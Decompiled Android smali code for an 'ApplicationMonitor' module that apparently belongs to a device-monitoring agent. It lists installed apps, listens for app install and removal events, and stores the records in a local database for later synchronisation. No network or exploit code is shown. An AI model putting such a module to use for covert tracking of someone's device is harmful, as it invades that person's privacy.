.class public Lcom/hp/vd/module/monitor/ApplicationMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "ApplicationMonitor.java"


# static fields
.field public static final ATTRIBUTE_START_LISTER_ON_START:Ljava/lang/String; = "start_lister_on_startup"

.field protected static final TAG:Ljava/lang/String; = "ApplicationMonitor"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/ApplicationData;",
            ">;"
        }
    .end annotation
.end field

.field protected initialApplicationListerThread:Ljava/lang/Thread;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/ApplicationData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 26
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 32
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 34
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->initialApplicationListerThread:Ljava/lang/Thread;

    .line 38
    iput-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const/4 v0, 0x0

    .line 39
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->monitoringStatus:Z

    return-void
.end method


# virtual methods
.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 46
    const-class v0, Lcom/hp/vd/data/ApplicationData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 51
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 53
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 54
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 55
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 56
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x3

    .line 57
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v3.0"

    .line 58
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data=text;"

    .line 68
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    .line 69
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v2, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "start_lister_on_startup=true;"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->custom:Ljava/lang/String;

    const/4 v1, 0x2

    .line 71
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 72
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 74
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "ApplicationMonitor"

    return-object v0
.end method

.method public initialize()Z
    .locals 5

    .line 106
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 113
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "ApplicationMonitor"

    .line 115
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "initialize(): start_lister_on_startup set to "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "start_lister_on_startup"

    .line 117
    invoke-virtual {v3, v4}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 115
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "ApplicationMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 121
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 143
    :goto_0
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 146
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->dao:Lcom/j256/ormlite/dao/Dao;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_1

    .line 155
    new-instance v1, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-direct {v1, v2, v3, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v1

    const-string v2, "ApplicationMonitor"

    const-string v3, "Could not create the Dao"

    .line 149
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 150
    invoke-virtual {v1}, Ljava/lang/Throwable;->printStackTrace()V

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 82
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ApplicationMonitor"

    const-string v2, "install() called."

    .line 83
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 89
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0x96

    .line 98
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 265
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->monitoringStatus:Z

    return v0
.end method

.method public start()Z
    .locals 9

    .line 169
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ApplicationMonitor"

    .line 170
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "start() called [version="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "]."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 172
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->isActivated()Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "ApplicationMonitor"

    const-string v2, "This module is currently DEactivated."

    .line 173
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const/4 v0, 0x0

    return v0

    .line 179
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    const/4 v7, 0x1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-ne v1, v7, :cond_1

    goto :goto_0

    :cond_1
    const-string v1, "ApplicationMonitor"

    .line 184
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "start(): writerThread is alive(). Did you call two times start()? [isInterrupted = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    .line 187
    invoke-virtual {v3}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v3, ", isAlive = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v3}, Ljava/lang/Thread;->isAlive()Z

    move-result v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    const-string v3, "]"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    .line 184
    invoke-interface {v0, v1, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto :goto_1

    .line 180
    :cond_2
    :goto_0
    new-instance v1, Ljava/lang/Thread;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v3, "Application-Writer-Queue"

    invoke-direct {v1, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    .line 181
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 192
    :goto_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "start_lister_on_startup"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-ne v1, v7, :cond_3

    .line 193
    new-instance v8, Lcom/hp/vd/module/monitor/application/ApplicationLister;

    .line 194
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    move-object v1, v8

    move-object v6, v0

    invoke-direct/range {v1 .. v6}, Lcom/hp/vd/module/monitor/application/ApplicationLister;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;Lcom/hp/vd/agent/log/IWriter;)V

    .line 201
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Application-Lister-Thread"

    invoke-direct {v1, v8, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->initialApplicationListerThread:Ljava/lang/Thread;

    .line 202
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->initialApplicationListerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 205
    :cond_3
    new-instance v1, Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v2, v0}, Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    .line 206
    new-instance v0, Landroid/content/IntentFilter;

    invoke-direct {v0}, Landroid/content/IntentFilter;-><init>()V

    const-string v1, "android.intent.action.PACKAGE_ADDED"

    .line 208
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "android.intent.action.PACKAGE_REMOVED"

    .line 209
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addAction(Ljava/lang/String;)V

    const-string v1, "package"

    .line 210
    invoke-virtual {v0, v1}, Landroid/content/IntentFilter;->addDataScheme(Ljava/lang/String;)V

    .line 212
    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v2, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    invoke-virtual {v1, v2, v0}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    .line 213
    iput-boolean v7, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->monitoringStatus:Z

    return v7
.end method

.method public stop()Z
    .locals 4

    .line 226
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "ApplicationMonitor"

    .line 227
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "stop() called [version="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/ApplicationMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v3

    iget-object v3, v3, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, "]."

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 233
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    if-eqz v0, :cond_0

    .line 234
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->receiver:Lcom/hp/vd/module/monitor/application/ApplicationBroadcastReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 241
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const/4 v1, 0x0

    if-eqz v0, :cond_1

    .line 242
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    invoke-virtual {v0, v1}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;->setIsStarted(Z)V

    .line 245
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_2

    .line 246
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 249
    :cond_2
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->initialApplicationListerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_3

    .line 250
    iget-object v0, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->initialApplicationListerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 257
    :cond_3
    iput-boolean v1, p0, Lcom/hp/vd/module/monitor/ApplicationMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method
